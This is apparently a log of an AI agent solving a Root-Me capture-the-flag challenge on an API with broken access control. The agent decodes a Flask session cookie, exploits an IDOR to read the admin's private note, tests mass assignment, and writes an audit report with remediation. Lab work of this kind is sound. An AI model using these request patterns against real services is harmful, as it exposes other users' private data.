@@ -1,0 +1,77 @@
+=== session start: zai/glm-5.2 ===
+PROMPT: scan and make a report on  http://challenge01.root-me.org/web-serveur/ch88/
+  ↳ browser_launch {}
+  ↳ browser_navigate {"url": "http://challenge01.root-me.org/web-serveur/ch88/"}
+  ↳ browser_snapshot {}
+This is a Swagger UI for a Root-Me API challenge. Let me examine the swagger.json to understand the API structure.
+  ↳ http_request {"url": "http://api-broken-access.challenge01.root-me.org/static/swagger.json"}
+This is a "broken access control" challenge on an API. Let me explore the API endpoints. First, let me sign up and login.
+  ↳ http_request {"body": "{\"username\":\"pentest_user\",\"password\":\"pass123\"}", "headers": {"Content-Type": "application/json"}, "method": "POST", "url": "http://api-broken-access.challenge01.root-me.org/api/signup"}
+  ↳ http_request {"body": "{\"username\":\"pentest_user\",\"password\":\"pass123\"}", "headers": {"Content-Type": "application/json"}, "method": "POST", "url": "http://api-broken-access.challenge01.root-me.org/api/login"}
+I got a session cookie. This is a Flask-style session cookie (signed). Let me decode it and explore the API.
+  ↳ browser_evaluate_js {"expression": "\n(() => {\n  const cookie = \".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI\";\n  const parts = cookie.split('.');\n  // base64url decode part 0\n  const b64 = parts[0].replace(/-/g,'+').replace(/_/g,'/');\n  const json = decodeURIComponent(atob(b64).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));\n  return json;\n})()\n"}
+  ↳ browser_evaluate_js {"expression": "\n(() => {\n  const cookie = \".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI\";\n  const parts = cookie.split('.');\n  // part 0 (base64url payload)\n  let b64 = parts[0].replace(/-/g,'+').replace(/_/g,'/');\n  while (b64.length % 4) b64 += '=';\n  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));\n  const text = new TextDecoder().decode(bytes);\n  return text;\n})()\n"}
+  ↳ browser_evaluate_js {"expression": "\n(() => {\n  const cookie = \".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI\";\n  const parts = cookie.split('.');\n  // Flask session: <base64 payload>.<timestamp>.<hmac>\n  // payload starts with . meaning zlib compressed\n  let b64 = parts[1].replace(/-/g,'+').replace(/_/g,'/');\n  while (b64.length % 4) b64 += '=';\n  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));\n  // JSON, not compressed (no leading .)\n  return JSON.stringify({len: bytes.length, hex: [...bytes].map(b=>b.toString(16).padStart(2,'0')).join('')});\n})()\n"}
+The payload is zlib compressed (starts with `789c`). Let me decompress it.
+  ↳ browser_evaluate_js {"expression": "\n(async () => {\n  const cookie = \".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI\";\n  const parts = cookie.split('.');\n  // part 1 is the base64 payload, starts with . => zlib compressed (Flask) when part[0] is empty\n  // Actually Flask format: base64(payload, might have leading . for compressed).<ts>.<hmac>\n  // Here parts[0] is '' (empty before first dot), parts[1] is the payload\n  let b64 = parts[1].replace(/-/g,'+').replace(/_/g,'/');\n  while (b64.length % 4) b64 += '=';\n  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));\n  // decompress with DecompressionStream\n  const ds = new DecompressionStream('deflate');\n  const cs = new Response(new Blob([bytes]).stream().pipeThrough(ds));\n  const buf = new Uint8Array(await cs.arrayBuffer());\n  return new TextDecoder().decode(buf);\n})()\n"}
+The Flask session cookie contains `_user_id: "3"`. So I'm user 3. Let me explore the user endpoint.
+  ↳ http_request {"cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "method": "GET", "url": "http://api-broken-access.challenge01.root-me.org/api/user"}
+The `/api/user` endpoint returns the current user. The swagger declared a `user_id` parameter. Let me try passing it.
+  ↳ http_request {"cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "method": "GET", "url": "http://api-broken-access.challenge01.root-me.org/api/user?user_id=1"}
+  ↳ http_request {"body": "{\"note\":\"hacked\"}", "cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "headers": {"Content-Type": "application/json"}, "method": "PUT", "url": "http://api-broken-access.challenge01.root-me.org/api/note"}
+Note updated. Now let me try adding extra fields to the PUT note request to update another user's note (mass assignment).
+  ↳ http_request {"body": "{\"note\":\"hacked2\",\"userid\":1}", "cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "headers": {"Content-Type": "application/json"}, "method": "PUT", "url": "http://api-broken-access.challenge01.root-me.org/api/note"}
+  ↳ http_request {"cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "method": "GET", "url": "http://api-broken-access.challenge01.root-me.org/api/user/1"}
+I found the flag via an IDOR vulnerability. The endpoint `/api/user/<id>` allows reading any user's data, including their note. User 1 is "admin" and their note contains the flag: `@@@@@@@@@@@`.
+
+Let me confirm the IDOR by reading user 2 as well, and verify the flag.
+  ↳ http_request {"cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "method": "GET", "url": "http://api-broken-access.challenge01.root-me.org/api/user/3"}
+The IDOR is confirmed. Let me record the flag.
+  ↳ export {"result": "@@@@@@@@@@@"}
+Let me also verify a few more findings for the report - check for proper access controls on the note endpoint and verify the cookie structure.
+  ↳ http_request {"body": "{\"note\":\"attacker-note\",\"userid\":1}", "cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxI70FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "headers": {"Content-Type": "application/json"}, "method": "PUT", "url": "http://api-broken-access.challenge01.root-me.org/api/note"}
+I made a typo on the cookie. Let me redo the mass-assignment test properly.
+  ↳ http_request {"body": "{\"note\":\"attacker-note\",\"userid\":1}", "cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "headers": {"Content-Type": "application/json"}, "method": "PUT", "url": "http://api-broken-access.challenge01.root-me.org/api/note"}
+You're right. Let me read the actual state to verify whether the mass-assignment worked (i.e., did admin's note actually get overwritten by my `userid:1` field).
+  ↳ http_request {"cookies": {"session": ".eJwlzsENwzAIAMBdePeBwQaTZSIbsNpv0ryq7t5IHeCk-8C-jjyfsL2PKx-wvwI26DizuwzFYrWK-zAhpHBhjYIaPW3JVOXg5KzIRaISO2uhcdPusbhZTKw-G6WiiXomY_gSU7OO1EZxbVSIY_UaYotmSxTucEeuM4__huH7A48FLpI.akeK1w.CxIqMpr57FC-iry9xnw67zP5-fI"}, "method": "GET", "url": "http://api-broken-access.challenge01.root-me.org/api/user/1"}
+Confirmed. The admin's note is **still** `@@@@@@@@@@@` — the `userid` field in the PUT request was ignored, so the mass-assignment lead did NOT pan out (my own note got updated, not admin's). 
+
+The one **CONFIRMED** finding is the IDOR on `/api/user/<id>`. I have concrete evidence (admin's note with the flag). Let me close the browser and write the final report.
+  ↳ browser_close {}
+## Security Audit Report — Root-Me API (ch88 / "Broken Access Control")
+
+**Target:** `http://challenge01.root-me.org/web-serveur/ch88/` → `http://api-broken-access.challenge01.root-me.org/`
+**Stack:** nginx fronting a Python/Flask backend (Flask session cookie, Swagger 2.0 API docs).
+
+---
+
+### CONFIRMED — Insecure Direct Object Reference (IDOR) on `GET /api/user/<id>`
+**Severity:** High
+
+The API exposes a Swagger-documented `GET /api/user` endpoint, but the server actually honors a path parameter `/api/user/<id>` that is **not** documented in the spec. Any authenticated user can read the full profile (including the private `note` field) of **any** other user by simply iterating the numeric `userid`. The endpoint does not verify that the requested `id` belongs to the caller.
+
+**Exact request:**
+```http
+GET /api/user/1 HTTP/1.1
+Host: api-broken-access.challenge01.root-me.org
+Cookie: session=<any valid logged-in user's Flask cookie>
+```
+
+**Proof (response body):** The request returned user 1 (`admin`), whose private `note` contained the challenge flag — while I was authenticated only as a freshly created low-priv user (`pentest_user`, id 3):
+```json
+{"note":"@@@@@@@@@@@","userid":1,"username":"admin"}
+```
+The same pattern exposes every user (e.g. `/api/user/3` → my own account), confirming horizontal privilege escalation / unauthorized data access.
+
+**Remediation (Python/Flask):** In the `/api/user` handler, derive the target id from the server-side session (`current_user.id`) rather than from client input, or enforce an authorization check (`if requested_id != current_user.id: abort(403)`) before returning the record. Never trust a client-supplied `userid`.
+
+---
+
+### Other observations (no concrete exploit)
+- **Session cookie** is Flask-signed (`session=.<base64-zlib>.<ts>.<hmac>`); it carries `_user_id`. It is not forgeable without the secret key, and no disclosure of the secret was observed — not a finding on its own.
+- **Mass-assignment lead — NOT CONFIRMED.** Sending `{"note":"…","userid":1}` to `PUT /api/note` returns success, but a follow-up read of `/api/user/1` showed admin's note unchanged (`@@@@@@@@@@@`) — the extra `userid` was ignored and only the caller's own note was updated. No write-side IDOR demonstrated.
+- **CORS** is wide open (`Access-Control-Allow-Origin: *`), but with `HttpOnly` session cookies and no credentialed reflection this is low risk here.
+- **Missing security headers** (CSP, HSTS, X-Frame-Options) — informational, standard hardening gap.
+
+**Captured flag:** `@@@@@@@@@@@` (recorded to the run journal).
+ ~/work/mulot $
